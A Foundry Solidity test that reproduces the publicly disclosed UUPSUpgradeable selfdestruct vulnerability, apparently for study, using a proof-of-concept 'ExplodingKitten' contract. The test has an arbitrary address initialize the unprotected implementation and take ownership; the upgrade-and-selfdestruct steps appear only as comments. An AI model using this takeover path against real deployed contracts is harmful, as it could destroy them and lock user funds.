// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {SimpleToken} from "../src/UUPS_selfdestruct/SimpleToken.sol";
import {ExplodingKitten} from "../src/UUPS_selfdestruct/ExplodingKitten.sol";

contract UUPS_selfdestruct is Test {
    // These contracts are from https://github.com/yehjxraymond/exploding-kitten
    // referenced by this post-mortem https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680
    SimpleToken public tokenAddress;
    ExplodingKitten public pocAddress;

    address public alice;
    address public emptyAddress;

    function setUp() public {
        tokenAddress = new SimpleToken();
        pocAddress = new ExplodingKitten();

        alice = address(0xABCD);
        emptyAddress = address(0xb8b3dbc6);
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // XXX Currently there is no better way to check if there is a contract in an address
        // than to check the size of the code at that address.
        // See https://ethereum.stackexchange.com/a/14016/36603
        // for more details about how this works.
        // TODO Check this again before the Serenity release, because all addresses will be
        // contracts then.
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function testSelfdestruct() public {
        // The problem is that anyone can initialize the contract
        vm.prank(address(alice));
        tokenAddress.initialize();
        assertEq(address(alice), tokenAddress.owner());
        assertEq(isContract(address(tokenAddress)), true);

        // Find the proxy address because upgradeToAndCall() has onlyProxy modifier, which requires going through the proxy
        // bytes32 proxyAddress = vm.load(address(tokenAddress), bytes32(uint256(0)));
        // address proxyAddress = tokenAddress.getSelfValue();
        // emit log_address(proxyAddress); // log the proxy address
        // emit log_address(address(tokenAddress)); // log the token address

        // tokenAddress.upgradeToAndCall(address(pocAddress), "0xb8b3dbc6");
        // tokenAddress.explode(); // this performs the selfdestruct operation

    }

}
